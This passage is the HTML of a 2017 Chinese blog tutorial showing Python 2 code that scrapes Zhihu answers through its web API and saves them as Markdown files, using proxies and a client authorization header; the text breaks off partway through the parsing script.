                <span class="post-meta-item">
                  <span class="post-meta-item-icon">
                    <i class="far fa-calendar"></i>
                  </span>
                  <span class="post-meta-item-text">发表于</span>
                  <time title="创建时间：2017-06-07 09:44:51" itemprop="dateCreated datePublished" datetime="2017-06-07T09:44:51+08:00">2017-06-07</time>
                </span>
                <span id="/4652.html" class="post-meta-item leancloud_visitors" data-flag-title="利用新接口抓取微信公众号的所有文章" title="阅读次数">
                  <span class="post-meta-item-icon">
                    <i class="fa fa-eye"></i>
                  </span>
                  <span class="post-meta-item-text">阅读次数：</span>
                  <span class="leancloud-visitors-count"></span>
                </span>
                <span class="post-meta-item" title="本文字数">
                  <span class="post-meta-item-icon">
                    <i class="far fa-file-word"></i>
                  </span>
                  <span class="post-meta-item-text">本文字数：</span>
                  <span>3.5k</span>
                </span>
                <span class="post-meta-item" title="阅读时长">
                  <span class="post-meta-item-icon">
                    <i class="far fa-clock"></i>
                  </span>
                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
                  <span>3 分钟</span>
                </span>
              </div>
            </article>
            <article itemscope itemtype="http://schema.org/Article" class="post-block index" lang="zh-CN">
              <link itemprop="mainEntityOfPage" href="https://cuiqingcai.com/4607.html">
              <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
                <meta itemprop="image" content="/images/avatar.png">
                <meta itemprop="name" content="崔庆才">
                <meta itemprop="description" content="静觅丨崔庆才的个人站点专业为您提供爬虫教程,爬虫,Python,Python爬虫,Python爬虫教程,爬虫书的相关信息，想要了解更多详情，请联系我们。">
              </span>
              <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
                <meta itemprop="name" content="静觅">
              </span>
              <header class="post-header">
                <h2 class="post-title" itemprop="name headline">
                  <a class="label"> Python <i class="label-arrow"></i>
                  </a>
                  <a href="/4607.html" class="post-title-link" itemprop="url">获取知乎问题答案并转换为MarkDown文件</a>
                </h2>
              </header>
              <div class="post-body" itemprop="articleBody">
                <div class="thumb">
                  <img itemprop="contentUrl" class="random">
                </div>
                <div class="excerpt">
                  <p>
                  <blockquote>
                    <h2 id="20170609-更新"><a href="#20170609-更新" class="headerlink" title="20170609 更新:"></a>20170609 更新:</h2>
                    <p><strong>感谢一介草民与 ftzz 的反馈</strong></p>
                    <h3 id="1-修复中文路径保存问题"><a href="#1-修复中文路径保存问题" class="headerlink" title="(1) 修复中文路径保存问题"></a>(1) 修复中文路径保存问题</h3>
                    <h3 id="2-修复-offset-问题"><a href="#2-修复-offset-问题" class="headerlink" title="(2) 修复 offset 问题"></a>(2) 修复 offset 问题</h3>
                    <h3 id="3-修复第一个问题"><a href="#3-修复第一个问题" class="headerlink" title="(3) 修复第一个问题"></a>(3) 修复第一个问题</h3>
                    <h2 id="来个好玩的东西"><a href="#来个好玩的东西" class="headerlink" title="来个好玩的东西"></a>来个好玩的东西</h2>
                    <h2 id=""><a href="#" class="headerlink" title="     "></a><a href="http://cdn.cuiqingcai.com/wp-content/uploads/2017/06/6f19c6ad326822c9e267d2d961cf1fec_r.png" target="_blank" rel="noopener"><img src="http://cdn.cuiqingcai.com/wp-content/uploads/2017/06/6f19c6ad326822c9e267d2d961cf1fec_r.png" alt=""></a> <a href="http://cdn.cuiqingcai.com/wp-content/uploads/2017/06/154e026013e7ec53e8ce94c8b4417973_r.jpeg" target="_blank" rel="noopener"><img src="http://cdn.cuiqingcai.com/wp-content/uploads/2017/06/154e026013e7ec53e8ce94c8b4417973_r.jpeg" alt=""></a> <a href="http://cdn.cuiqingcai.com/wp-content/uploads/2017/06/0838fb7d2c9d61070605148ab57f90cb_r.png" target="_blank" rel="noopener"><img src="http://cdn.cuiqingcai.com/wp-content/uploads/2017/06/0838fb7d2c9d61070605148ab57f90cb_r.png" alt=""></a> <a href="http://cdn.cuiqingcai.com/wp-content/uploads/2017/06/a1e43e58c01f1e36630f4a1394811b67_r.png" target="_blank" rel="noopener"><img src="http://cdn.cuiqingcai.com/wp-content/uploads/2017/06/a1e43e58c01f1e36630f4a1394811b67_r.png" alt=""></a> <a href="http://cdn.cuiqingcai.com/wp-content/uploads/2017/06/d851605dddb3e14ad9946a3eccc0ae05_r.jpeg" target="_blank" rel="noopener"><img src="http://cdn.cuiqingcai.com/wp-content/uploads/2017/06/d851605dddb3e14ad9946a3eccc0ae05_r.jpeg" alt=""></a> <a href="http://cdn.cuiqingcai.com/wp-content/uploads/2017/06/f8acc0c27d15fcfd8b2c9682aabe6633_r.png" target="_blank" rel="noopener"><img src="http://cdn.cuiqingcai.com/wp-content/uploads/2017/06/f8acc0c27d15fcfd8b2c9682aabe6633_r.png" alt=""></a></h2>
                    <h2 id="20170607-更新"><a href="#20170607-更新" class="headerlink" title="20170607 更新:"></a>20170607 更新:</h2>
                    <h3 id="1-感谢-Ftzz-提醒-将图片替换为原图"><a href="#1-感谢-Ftzz-提醒-将图片替换为原图" class="headerlink" title="(1) 感谢 Ftzz 提醒, 将图片替换为原图"></a>(1) 感谢 Ftzz 提醒, 将图片替换为原图</h3>
                    <h3 id="2-将文件保存到本地-解决了最大的缺点问题-不用联网也可以看了"><a href="#2-将文件保存到本地-解决了最大的缺点问题-不用联网也可以看了" class="headerlink" title="(2) 将文件保存到本地,解决了最大的缺点问题,不用联网也可以看了"></a>(2) 将文件保存到本地,解决了最大的缺点问题,不用联网也可以看了</h3>
                  </blockquote>
                  <p>大家好，我是四毛。 <a href="http://cdn.cuiqingcai.com/wp-content/uploads/2017/02/QQ图片20170205084843.jpg" target="_blank" rel="noopener"><img src="http://cdn.cuiqingcai.com/wp-content/uploads/2017/02/QQ图片20170205084843.jpg" alt=""></a> <strong>写在前面的话</strong> 在开始前，给大家分享一个前段时间逛 Github 时看到的某个爬虫脚本中的内容： <a href="http://cdn.cuiqingcai.com/wp-content/uploads/2017/06/lvshi.jpg" target="_blank" rel="noopener"><img src="http://cdn.cuiqingcai.com/wp-content/uploads/2017/06/lvshi.jpg" alt=""></a> 所以，大家爬网站的时候，还是友善一点为好，且爬且珍惜啊。 好了，言归正传。 今天主要讲一下如何将某一个知乎问题的所有答案转换为本地 MarkDown 文件。</p>
                  <h2 id="前期准备"><a href="#前期准备" class="headerlink" title="前期准备"></a>前期准备</h2>
                  <blockquote>
                    <p>python2.7 html2text markdownpad(这里随意，只要可以支持 md 就行) 会抓包。。。。。 最重要的是你要有代理，因为知乎开始封 IP 了</p>
                  </blockquote>
                  <h2 id="1-什么是-MarkDown-文件"><a href="#1-什么是-MarkDown-文件" class="headerlink" title="1.什么是 MarkDown 文件"></a><strong>1.什么是 MarkDown 文件</strong></h2>
                  <p>Markdown 是一种用来写作的轻量级<strong>「标记语言」</strong>，它用简洁的语法代替排版，而不像一般我们用的字处理软件 <em>Word</em> 或 <em>Pages</em> 有大量的排版、字体设置。它使我们专心于码字，用「标记」语法，来代替常见的排版格式。例如此文从内容到格式，甚至插图，键盘就可以通通搞定了。 恩，上面是我抄的，哈哈。想多了解的可以看看<a href="http://www.jianshu.com/p/1e402922ee32/" target="_blank" rel="noopener">这里</a>。</p>
                  <h2 id="2-为什么要将答案转为-MarkDwon"><a href="#2-为什么要将答案转为-MarkDwon" class="headerlink" title="2.为什么要将答案转为 MarkDwon"></a><strong>2.为什么要将答案转为 MarkDwon</strong></h2>
                  <p>因为。。。。。。懒，哈哈，开个玩笑。最重要的原因还是 markdown 看着比较舒服。平时写脚本的时候，也一直在思考一个问题，如何将一个文字与图片穿插的网页原始的保存下来呢。如果借助工具的话，那就很多了，CTRL+P 打印的时候，选择另存为 PDF，或者搞个印象笔记，直接保存整个网页。那么，我们如何用爬虫实现呢？正好前几天看到了<a href="https://github.com/egrcc/zhihu-python" target="_blank" rel="noopener">这个项目</a>，仔细研究了一下，大受启发。</p>
                  <h2 id="3-原理"><a href="#3-原理" class="headerlink" title="3.原理"></a><strong>3.原理</strong></h2>
                  <p>原理说起来很简单：获取请求到的内容的 BODY 部分，然后重新构建一个 HTML 文件，接着利用 html2text 这个模块将其转换为 markdown 文件，最后对图片及标题按照 markdown 的格式做一些处理就好了。目前应用的场景主要是在知乎。</p>
                  <h2 id="4-Show-Code"><a href="#4-Show-Code" class="headerlink" title="4.Show Code"></a><strong>4.Show Code</strong></h2>
                  <h3 id="4-1-获取知乎答案"><a href="#4-1-获取知乎答案" class="headerlink" title="4.1 获取知乎答案"></a>4.1 获取知乎答案</h3>
                  <p>写代码的时候，主要考虑了两种使用场景。第一，获取某一特定答案的数据然后进行转换；第二，获取某一个问题的所有答案进行然后挨个进行转换，在这里可以 通过赞同数来对要获取的答案进行质量控制。 <strong> 4.1.1、某一个特定答案的数据获取</strong></p>
                  <blockquote>
                    <p>url：<a href="https://www.zhihu.com/question/27621722/answer/48658220（前面那个是问题ID，后边的是答案ID）" target="_blank" rel="noopener">https://www.zhihu.com/question/27621722/answer/48658220（前面那个是问题ID，后边的是答案ID）</a></p>
                  </blockquote>
                  <p>这一数据的获取我这里分为了两个部分，第一部分请求上述网址，拿到答案主体数据以及赞同数，第二部分请求下面这个接口：</p>
                  <blockquote>
                    <p><a href="https://www.zhihu.com/api/v4/answers/48658220" target="_blank" rel="noopener">https://www.zhihu.com/api/v4/answers/48658220</a></p>
                  </blockquote>
                  <p>为什么会这样？因为这个接口得到的答案正文数据不是完整数据，所以只能分两步了。 <strong> 4.1.2、某一个特定答案的数据获取</strong> 这一个数据就可以通过很简单的方式得到了，接口如下：</p>
                  <blockquote>
                    <p><a href="https://www.zhihu.com/api/v4/questions/27621722/answers?sort_by=default&amp;include=data%5B%2A%5D.is_normal%2Cis_collapsed%2Ccollapse_reason%2Cis_sticky%2Ccollapsed_by%2Csuggest_edit%2Ccomment_count%2Ccan_comment%2Ccontent%2Ceditable_content%2Cvoteup_count%2Creshipment_settings%2Ccomment_permission%2Cmark_infos%2Ccreated_time%2Cupdated_time%2Crelationship.is_authorized%2Cis_author%2Cvoting%2Cis_thanked%2Cis_nothelp%2Cupvoted_followees%3Bdata%5B%2A%5D.author.follower_count%2Cbadge%5B%3F%28type%3Dbest_answerer%29%5D.topics&amp;limit=20&amp;offset=3" target="_blank" rel="noopener">https://www.zhihu.com/api/v4/questions/27621722/answers?sort_by=default&amp;include=data%5B%2A%5D.is_normal%2Cis_collapsed%2Ccollapse_reason%2Cis_sticky%2Ccollapsed_by%2Csuggest_edit%2Ccomment_count%2Ccan_comment%2Ccontent%2Ceditable_content%2Cvoteup_count%2Creshipment_settings%2Ccomment_permission%2Cmark_infos%2Ccreated_time%2Cupdated_time%2Crelationship.is_authorized%2Cis_author%2Cvoting%2Cis_thanked%2Cis_nothelp%2Cupvoted_followees%3Bdata%5B%2A%5D.author.follower_count%2Cbadge%5B%3F%28type%3Dbest_answerer%29%5D.topics&amp;limit=20&amp;offset=3</a></p>
                  </blockquote>
                  <p>返回的都是 JSON 数据，很方便获取。但是这里有一个地方需要注意，从这里面取的答案正文数据就是文本数据，不是一个完整的 html 文件，所以需要在构造一下。 <strong> 4.1.2、保存的字段</strong></p>
                  <blockquote>
                    <p>author_name 回答用户名 answer_id 答案 ID question_id 问题 ID question_title 问题 vote_up_count 赞同数 create_time 创建时间 答案主体</p>
                  </blockquote>
                  <h3 id="4-2-Code"><a href="#4-2-Code" class="headerlink" title="4.2 Code"></a>4.2 Code</h3>
                  <p>主脚本：zhihu.py</p>
                  <figure class="highlight python">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># Created by shimeng on 17-6-5</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> html2text</span><br><span class="line"><span class="keyword">from</span> parse_content <span class="keyword">import</span> parse</span><br><span class="line"></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">just for study and fun</span></span><br><span class="line"><span class="string">Talk is cheap</span></span><br><span class="line"><span class="string">show me your code</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ZhiHu</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></span><br><span class="line">         self.request_content = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">request</span><span class="params">(self, url, retry_times=<span class="number">10</span>)</span>:</span></span><br><span class="line">        header = &#123;</span><br><span class="line">            <span class="string">'User-Agent'</span>: <span class="string">'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.133 Safari/537.36'</span>,</span><br><span class="line">            <span class="string">'authorization'</span>: <span class="string">'oauth c3cef7c66a1843f8b3a9e6a1e3160e20'</span>,</span><br><span class="line">            <span class="string">'Host'</span>: <span class="string">'www.zhihu.com'</span></span><br><span class="line">        &#125;</span><br><span class="line">        times = <span class="number">0</span></span><br><span class="line">        <span class="keyword">while</span> retry_times&gt;<span class="number">0</span>:</span><br><span class="line">            times += <span class="number">1</span></span><br><span class="line">            <span class="keyword">print</span> <span class="string">'request %s, times: %d'</span> %(url, times)</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                ip = <span class="string">'your proxy ip'</span></span><br><span class="line">                <span class="keyword">if</span> ip:</span><br><span class="line">                    proxy = &#123;</span><br><span class="line">                        <span class="string">'http'</span>: <span class="string">'http://%s'</span> % ip,</span><br><span class="line">                        <span class="string">'https'</span>: <span class="string">'http://%s'</span> % ip</span><br><span class="line">                    &#125;</span><br><span class="line">                    self.request_content = requests.get(url, headers=header, proxies=proxy, timeout=<span class="number">10</span>).content</span><br><span class="line">            <span class="keyword">except</span> Exception, e:</span><br><span class="line">                <span class="keyword">print</span> e</span><br><span class="line">                retry_times -= <span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">return</span> self.request_content</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_all_answer_content</span><span class="params">(self, question_id, flag=<span class="number">2</span>)</span>:</span></span><br><span class="line">        first_url_format = <span class="string">'https://www.zhihu.com/api/v4/questions/&#123;&#125;/answers?sort_by=default&amp;include=data%5B%2A%5D.is_normal%2Cis_collapsed%2Ccollapse_reason%2Cis_sticky%2Ccollapsed_by%2Csuggest_edit%2Ccomment_count%2Ccan_comment%2Ccontent%2Ceditable_content%2Cvoteup_count%2Creshipment_settings%2Ccomment_permission%2Cmark_infos%2Ccreated_time%2Cupdated_time%2Crelationship.is_authorized%2Cis_author%2Cvoting%2Cis_thanked%2Cis_nothelp%2Cupvoted_followees%3Bdata%5B%2A%5D.author.follower_count%2Cbadge%5B%3F%28type%3Dbest_answerer%29%5D.topics&amp;limit=20&amp;offset=3'</span></span><br><span class="line">        first_url = first_url_format.format(question_id)</span><br><span class="line">        response = self.request(first_url)</span><br><span class="line">        <span class="keyword">if</span> response:</span><br><span class="line">            contents = json.loads(response)</span><br><span class="line">            <span class="keyword">print</span> contents.get(<span class="string">'paging'</span>).get(<span class="string">'is_end'</span>)</span><br><span class="line">            <span class="keyword">while</span> <span class="keyword">not</span> contents.get(<span class="string">'paging'</span>).get(<span class="string">'is_end'</span>):</span><br><span class="line">                <span class="keyword">for</span> content <span class="keyword">in</span> contents.get(<span class="string">'data'</span>):</span><br><span class="line">                    self.parse_content(content, flag)</span><br><span class="line">                next_page_url = contents.get(<span class="string">'paging'</span>).get(<span class="string">'next'</span>).replace(<span class="string">'http'</span>, <span class="string">'https'</span>)</span><br><span class="line">                contents = json.loads(self.request(next_page_url))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">raise</span> ValueError(<span class="string">'request failed, quit......'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_single_answer_content</span><span class="params">(self, answer_url, flag=<span class="number">1</span>)</span>:</span></span><br><span class="line">        all_content = &#123;&#125;</span><br><span class="line">        question_id, answer_id = re.findall(<span class="string">'https://www.zhihu.com/question/(\d+)/answer/(\d+)'</span>, answer_url)[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">        html_content = self.request(answer_url)</span><br><span class="line">        <span class="keyword">if</span> html_content:</span><br><span class="line">            all_content[<span class="string">'main_content'</span>] = html_content</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">raise</span>  ValueError(<span class="string">'request failed, quit......'</span>)</span><br><span class="line"></span><br><span class="line">        ajax_answer_url = <span class="string">'https://www.zhihu.com/api/v4/answers/&#123;&#125;'</span>.format(answer_id)</span><br><span class="line">        ajax_content = self.request(ajax_answer_url)</span><br><span class="line">        <span class="keyword">if</span> ajax_content:</span><br><span class="line">            all_content[<span class="string">'ajax_content'</span>] = json.loads(ajax_content)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">raise</span>  ValueError(<span class="string">'request failed, quit......'</span>)</span><br><span class="line"></span><br><span class="line">        self.parse_content(all_content, flag, )</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">parse_content</span><span class="params">(self, content, flag=None)</span>:</span></span><br><span class="line">        data = parse(content, flag)</span><br><span class="line">        self.transform_to_markdown(data)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">transform_to_markdown</span><span class="params">(self, data)</span>:</span></span><br><span class="line">        content = data[<span class="string">'content'</span>]</span><br><span class="line">        author_name = data[<span class="string">'author_name'</span>]</span><br><span class="line">        answer_id = data[<span class="string">'answer_id'</span>]</span><br><span class="line">        question_id = data[<span class="string">'question_id'</span>]</span><br><span class="line">        question_title = data[<span class="string">'question_title'</span>]</span><br><span class="line">        vote_up_count = data[<span class="string">'vote_up_count'</span>]</span><br><span class="line">        create_time = data[<span class="string">'create_time'</span>]</span><br><span class="line"></span><br><span class="line">        file_name = <span class="string">u'%s--%s的回答[%d].md'</span> % (question_title, author_name,answer_id)</span><br><span class="line">        folder_name = <span class="string">u'%s'</span> % (question_title)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(os.path.join(os.getcwd(),folder_name)):</span><br><span class="line">            os.mkdir(folder_name)</span><br><span class="line">        os.chdir(folder_name)</span><br><span class="line"></span><br><span class="line">        f = open(file_name, <span class="string">"wt"</span>)</span><br><span class="line">        f.write(<span class="string">"-"</span> * <span class="number">40</span> + <span class="string">"\n"</span>)</span><br><span class="line">        origin_url = <span class="string">'https://www.zhihu.com/question/&#123;&#125;/answer/&#123;&#125;'</span>.format(question_id, answer_id)</span><br><span class="line">        f.write(<span class="string">"## 本答案原始链接: "</span> + origin_url + <span class="string">"\n"</span>)</span><br><span class="line">        f.write(<span class="string">"### question_title: "</span> + question_title.encode(<span class="string">'utf-8'</span>) + <span class="string">"\n"</span>)</span><br><span class="line">        f.write(<span class="string">"### Author_Name: "</span> + author_name.encode(<span class="string">'utf-8'</span>) + <span class="string">"\n"</span>)</span><br><span class="line">        f.write(<span class="string">"### Answer_ID: %d"</span> % answer_id + <span class="string">"\n"</span>)</span><br><span class="line">        f.write(<span class="string">"### Question_ID %d: "</span> % question_id + <span class="string">"\n"</span>)</span><br><span class="line">        f.write(<span class="string">"### VoteCount: %s"</span> % vote_up_count + <span class="string">"\n"</span>)</span><br><span class="line">        f.write(<span class="string">"### Create_Time: "</span> + create_time + <span class="string">"\n"</span>)</span><br><span class="line">        f.write(<span class="string">"-"</span> * <span class="number">40</span> + <span class="string">"\n"</span>)</span><br><span class="line"></span><br><span class="line">        text = html2text.html2text(content.decode(<span class="string">'utf-8'</span>)).encode(<span class="string">"utf-8"</span>)</span><br><span class="line">        <span class="comment"># 标题</span></span><br><span class="line">        r = re.findall(<span class="string">r'**(.*?)**'</span>, text, re.S)</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> r:</span><br><span class="line">            <span class="keyword">if</span> i != <span class="string">" "</span>:</span><br><span class="line">                text = text.replace(i, i.strip())</span><br><span class="line"></span><br><span class="line">        r = re.findall(<span class="string">r'_(.*)_'</span>, text)</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> r:</span><br><span class="line">            <span class="keyword">if</span> i != <span class="string">" "</span>:</span><br><span class="line">                text = text.replace(i, i.strip())</span><br><span class="line">        text = text.replace(<span class="string">'_ _'</span>, <span class="string">''</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 图片</span></span><br><span class="line">        r = re.findall(<span class="string">r'![]\((?:.*?)\)'</span>, text)</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> r:</span><br><span class="line">            text = text.replace(i, i + <span class="string">"\n\n"</span>)</span><br><span class="line"></span><br><span class="line">        f.write(text)</span><br><span class="line"></span><br><span class="line">        f.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    zhihu = ZhiHu()</span><br><span class="line">    url = <span class="string">'https://www.zhihu.com/question/27621722/answer/105331078'</span></span><br><span class="line">    zhihu.get_single_answer_content(url)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># question_id = '27621722'</span></span><br><span class="line">    <span class="comment"># zhihu.get_all_answer_content(question_id)</span></span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>zhihu.py 为主脚本，内容很简单，发起请求，调用解析函数进行解析，最后再进行保存。 解析函数脚本：parse_content.py</p>
                  <figure class="highlight routeros">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># Created by shimeng on 17-6-5</span></span><br><span class="line">import time</span><br><span class="line"><span class="keyword">from</span> bs4 import BeautifulSoup</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def html_template(data):</span><br><span class="line">    # api content</span><br><span class="line">    html = <span class="string">''</span><span class="string">'</span></span><br><span class="line"><span class="string">        &lt;html&gt;</span></span><br><span class="line"><span class="string">        &lt;head&gt;</span></span><br><span class="line"><span class="string">        &lt;body&gt;</span></span><br><span class="line"><span class="string">        %s</span></span><br><span class="line"><span class="string">        &lt;/body&gt;</span></span><br><span class="line"><span class="string">        &lt;/head&gt;</span></span><br><span class="line"><span class="string">        &lt;/html&gt;</span></span><br><span class="line"><span class="string">        '</span><span class="string">''</span> % data</span><br><span class="line">    return html</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def parse(content, <span class="attribute">flag</span>=None):</span><br><span class="line">    data = &#123;&#125;</span><br><span class="line">    <span class="keyword">if</span> flag == 1:</span><br><span class="line">        # single</span><br><span class="line">        main_content = content.<span class="builtin-name">get</span>(<span class="string">'main_content'</span>)</span><br><span class="line">        ajax_content = content.<span class="builtin-name">get</span>(<span class="string">'ajax_content'</span>)</span><br><span class="line"></span><br><span class="line">        soup = BeautifulSoup(main_content.decode(<span class="string">"utf-8"</span>), <span class="string">"lxml"</span>)</span><br><span class="line">        answer = soup.<span class="builtin-name">find</span>(<span class="string">"span"</span>, <span class="attribute">class_</span>=<span class="string">"RichText CopyrightRichText-richText"</span>)</span><br><span class="line"></span><br><span class="line">        author_name = ajax_content.<span class="builtin-name">get</span>(<span class="string">'author'</span>).<span class="builtin-name">get</span>(<span class="string">'name'</span>)</span><br><span class="line">        answer_id = ajax_content.<span class="builtin-name">get</span>(<span class="string">'id'</span>)</span><br><span class="line">        question_id = ajax_content.<span class="builtin-name">get</span>(<span class="string">'question'</span>).<span class="builtin-name">get</span>(<span class="string">'id'</span>)</span><br><span class="line">        question_title = ajax_content.<span class="builtin-name">get</span>(<span class="string">'question'</span>).<span class="builtin-name">get</span>(<span class="string">'title'</span>)</span><br><span class="line">        vote_up_count = soup.<span class="builtin-name">find</span>(<span class="string">"meta"</span>, <span class="attribute">itemprop</span>=<span class="string">"upvoteCount"</span>)[<span class="string">"content"</span>]</span><br><span class="line">        create_time = time.strftime(<span class="string">"%Y-%m-%d %H:%M:%S"</span>, time.localtime(ajax_content.<span class="builtin-name">get</span>(<span class="string">'created_time'</span>)))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        # all</span><br><span class="line">        answer_content = content.<span class="builtin-name">get</span>(<span class="string">'content'</span>)</span><br><span class="line"></span><br><span class="line">        author_name = content.<span class="builtin-name">get</span>(<span class="string">'author'</span>).<span class="builtin-name">get</span>(<span class="string">'name'</span>)</span><br><span class="line">        answer_id = content.<span class="builtin-name">get</span>(<span 